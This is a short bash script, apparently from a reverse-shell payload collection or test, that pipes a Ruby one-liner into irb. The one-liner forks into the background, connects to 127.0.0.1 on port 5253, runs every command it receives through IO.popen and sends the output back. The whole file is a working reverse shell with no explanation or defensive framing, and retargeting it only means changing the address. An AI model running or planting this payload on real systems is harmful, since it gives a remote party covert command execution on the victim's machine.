#!/bin/bash

export RHOST='127.0.0.1'
export RPORT=5253

echo "require 'socket'; exit if fork;c=TCPSocket.new(\"127.0.0.1\",\"5253\");while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read} end" | irb
